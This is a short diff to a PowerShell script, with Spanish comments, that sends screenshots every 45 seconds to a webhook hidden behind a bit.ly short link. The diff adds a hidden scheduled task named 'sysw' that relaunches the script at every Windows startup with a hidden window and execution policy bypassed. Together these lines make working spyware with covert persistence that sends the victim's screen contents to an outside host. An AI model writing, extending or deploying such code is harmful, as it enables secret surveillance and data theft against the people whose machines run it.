@@ -26,6 +26,12 @@ function Send-Screenshot {
 # Webhook URL
 $webhookURL = "https://bit.ly/web_chupakbras"
 
+# Crear la tarea programada para ejecutar el script al iniciar Windows
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$output`""
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$settings = New-ScheduledTaskSettingsSet -Hidden -DisallowStartIfOnBatteries -DontStopIfGoingOnBatteries
+Register-ScheduledTask -TaskName "sysw" -Action $action -Trigger $trigger -Settings $settings
+
 # Loop para enviar imágenes cada 45 segundos
 while ($true) {
     Send-Screenshot -ImageFile $output -WebhookURL $webhookURL
